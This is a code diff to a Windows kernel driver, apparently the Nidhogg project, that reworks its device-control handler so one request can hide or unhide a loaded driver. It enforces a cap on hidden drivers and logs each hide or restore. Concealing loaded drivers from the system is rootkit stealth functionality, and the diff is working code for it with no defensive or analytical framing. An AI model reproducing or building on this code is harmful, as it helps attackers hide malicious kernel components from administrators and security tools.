@@ -728,13 +728,31 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = NidhoggMemoryUtils->HideDriver(data);
+		if (data->Hide) {
+			if (NidhoggMemoryUtils->GetHiddenDrivers() == MAX_HIDDEN_DRIVERS) {
+				KdPrint((DRIVER_PREFIX "Too many items.\n"));
+				status = STATUS_TOO_MANY_CONTEXT_IDS;
+				break;
+			}
 
-		if (NT_SUCCESS(status)) {
-			auto prevIrql = KeGetCurrentIrql();
-			KeLowerIrql(PASSIVE_LEVEL);
-			KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", (*data).DriverName));
-			KeRaiseIrql(prevIrql, &prevIrql);
+			status = NidhoggMemoryUtils->HideDriver(data);
+
+			if (NT_SUCCESS(status)) {
+				auto prevIrql = KeGetCurrentIrql();
+				KeLowerIrql(PASSIVE_LEVEL);
+				KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", data->DriverName));
+				KeRaiseIrql(prevIrql, &prevIrql);
+			}
+		}
+		else {
+			status = NidhoggMemoryUtils->UnhideDriver(data);
+
+			if (NT_SUCCESS(status)) {
+				auto prevIrql = KeGetCurrentIrql();
+				KeLowerIrql(PASSIVE_LEVEL);
+				KdPrint((DRIVER_PREFIX "Restored driver %ws.\n", data->DriverName));
+				KeRaiseIrql(prevIrql, &prevIrql);
+			}
 		}
 
 		len += sizeof(HiddenDriverInformation);
